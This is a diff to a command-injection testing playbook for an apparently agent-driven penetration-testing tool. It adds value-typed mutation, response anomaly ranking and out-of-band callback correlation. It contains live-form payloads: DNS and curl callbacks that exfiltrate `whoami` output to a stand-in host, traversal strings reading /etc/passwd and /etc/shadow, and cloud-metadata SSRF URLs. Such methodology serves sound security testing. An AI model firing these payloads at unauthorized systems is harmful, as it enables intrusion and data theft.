@@ -22,6 +22,8 @@ Command injection in 2025 lives in: file conversion endpoints (ImageMagick, FFmp
 - `aith assess kali exec -- curl ...` (deliver injection payloads — all target-facing requests must go through the kali exec wrapper; use `--technique CMDI --probe-kind payload --phase consume-test --timeout 30`, switching to `--probe-kind exploit` once code execution is confirmed)
 - Burp Suite Repeater + Intruder (craft the request — then replay via kali exec for audit pipeline coverage)
 - `aith assess kali exec --technique CMDI --probe-kind payload --phase consume-test --timeout 300 -- commix ...` (automated command injection — useful for initial sweep, but misses argument injection entirely)
+- `aith assess classify-payload <value> --mutations` (type the injected parameter value and generate type-aware variants — see "Type the Injected Value First" below)
+- `aith oob mint` / `aith oob poll` (mint a nonce-tagged callback URL and correlate blind-injection hits — see DNS-Based below; this replaces reading the listener log by hand)
 - Custom wordlists for injection payloads (prepare host-side, deliver via kali exec)
 
 ---
@@ -57,6 +59,26 @@ This matters more than most testers realize:
 - **Windows cmd.exe** — `&`, `|`, `&&`, `||` separators; `^` for character escaping; environment variable slicing for character construction
 
 **How to identify**: inject `echo $0` or `echo $SHELL` if you have output. Blind: test bash-only features (brace expansion) — if they fail but simpler payloads work, you're on sh/dash.
+
+---
+
+## Type the Injected Value First
+
+Command injection parameters are rarely free-form — they carry a *filename*, a *hostname*, a *URL*, a *path*, or an *ID* that the app hands to an OS command. Before hand-picking separators, classify the value you are about to tamper with and let the oracle enumerate type-appropriate variants. This is most useful for the **argument-injection** and **filename-as-flag** paths below, where the productive payload is a format/escalation variant of the legitimate value, not a shell separator.
+
+```bash
+aith assess classify-payload "report-2025.png" --mutations
+aith assess classify-payload "https://target/img.jpg" --mutations    # type: url
+aith assess classify-payload "../uploads/file.pdf" --mutations        # type: path
+```
+
+Consume the output by intent bucket:
+
+- **`escalation`** — for a `path` value this yields `../../etc/passwd`, `../../../etc/shadow`, `/etc/passwd`, `/admin`, `/internal` (and, past the default 5-cap, the `%2F`-encoded traversal and `value/..` — pass `--max-per-intent 7` to surface them); for a `url` value it yields `http://169.254.169.254/latest/meta-data/`, `http://localhost/admin`, `http://[::1]/` (the FFmpeg/ImageMagick SSRF cases below). Fire these first against wrapper-tool parameters.
+- **`format`** — for a `path` value this gives the Windows-style `\`-separated and `%2F`-encoded forms (parser-confusion that slips traversal past a naive filter); for a `url` value it downgrades the scheme and mangles the separator.
+- **`boundary`** — `path` boundaries (`/`, `.`, `/etc/passwd`, `/proc/self/environ`) and `url` boundaries (`file:///etc/passwd`, `javascript:alert(1)`) probe how the wrapper reacts to degenerate inputs.
+
+Each variant is a literal string — drop it into the parameter slot and deliver via the kali exec wrapper. Use this to seed the candidate list deterministically instead of typing traversal/encoding permutations by hand; it does NOT replace the shell-separator payloads in the next section (those are not value-typed — the value there is a separator, not a filename/URL).
 
 ---
 
@@ -196,27 +218,51 @@ Sleep-based detection is unreliable in noisy networks. A 5-second payload that a
 3. **Differential confirmation**: inject `sleep 10`. If delta is consistently ~10s (double the previous) → confirmed. A timing-only result that does not show this differential pattern is not confirmed.
 4. **False positive check**: if the app is slow due to processing (heavy page, file upload), the "delay" may be application logic, not injection.
 
+**Triaging a separator sweep:** when you fire a batch of separator/bypass variants (the table above, or a commix run) and the timing signal is muddy, capture each response as a record (`{"url":..., "status":..., "content_length":..., "words":..., "lines":...}`) and let the anomaly oracle pick the odd one out instead of eyeballing dozens of near-identical bodies:
+
+```bash
+aith assess anomaly-score responses.jsonl --top 5
+```
+
+The injected-command response usually diverges from the benign-separator population on `status`, `length_bucket`, or `words_bucket`. Investigate the top-ranked outlier first — that is the separator that reached the shell. A flat ranking (every record scores ~0) means no separator changed the response shape: the value is sanitized or you are on a direct-exec path (argument injection only).
+
 ### DNS-Based (Most Reliable Blind Confirmation)
 
 DNS callbacks are the most reliable blind confirmation because they are out-of-band and binary (hit or no hit).
 
+Confirm readiness with `aith oob status --json`, then **mint a nonce-tagged callback** so the hit is self-correlating instead of eyeballed out of the listener log:
+
 ```bash
-# Subshell
-$(nslookup $OOB_URL)
-# Backtick
-`nslookup $OOB_URL`
-# With data exfil
-$(nslookup $(whoami).$OOB_URL)
-# Without nslookup (dig may be available when nslookup is not)
-$(dig $OOB_URL)
-# curl-based OOB (if DNS tools are stripped)
-$(curl http://$OOB_URL/)
+# Mint one nonce per injection point; record the correlation context.
+aith oob mint --technique cmdi --target-url "https://target/convert" --param filename --probe-kind dns --json
+# -> nonce  <prefix>-<token>
+#    http   http://<prefix>-<token>.researcher.example/
+#    dns    <prefix>-<token>.researcher.example
 ```
 
-Use `aith oob status --json` to confirm OOB readiness, then use the unique URL
-from `aith oob client logs <name> --lines 80` in payloads and read the same
-client log for correlated hits. If OOB is unavailable, fall back to timing and
-record a runtime issue when OOB would have been decisive.
+Embed the minted host in the payload and fire it through the kali exec wrapper:
+
+```bash
+OOB=<prefix>-<token>.researcher.example
+# Subshell
+$(nslookup $OOB)
+# Backtick
+`nslookup $OOB`
+# With data exfil — the exfiltrated value becomes the left label of the callback host
+$(nslookup $(whoami).$OOB)
+# Without nslookup (dig may be available when nslookup is not)
+$(dig $OOB)
+# curl-based OOB (if DNS tools are stripped)
+$(curl http://$OOB/)
+```
+
+Then **poll for the correlated hit** instead of reading the listener log by hand:
+
+```bash
+aith oob poll --client <name> --json
+```
+
+Consume the result by reading the `matched` array: each entry pairs the callback (`protocol`, `remote_address`, `observed_at`) with the recorded probe (`technique`, `target_url`), so a non-empty `matched` for your nonce is the binary confirmation — no log grepping. A DNS-data-exfil payload surfaces the leaked value as the left label of the matched callback host. `unmatched` interactions are callbacks with no recorded probe (background noise or another technique). If `matched` stays empty after the payload lands, fall back to timing and record a runtime issue noting OOB would have been decisive.
 
 ### File Creation + Read-Back
 
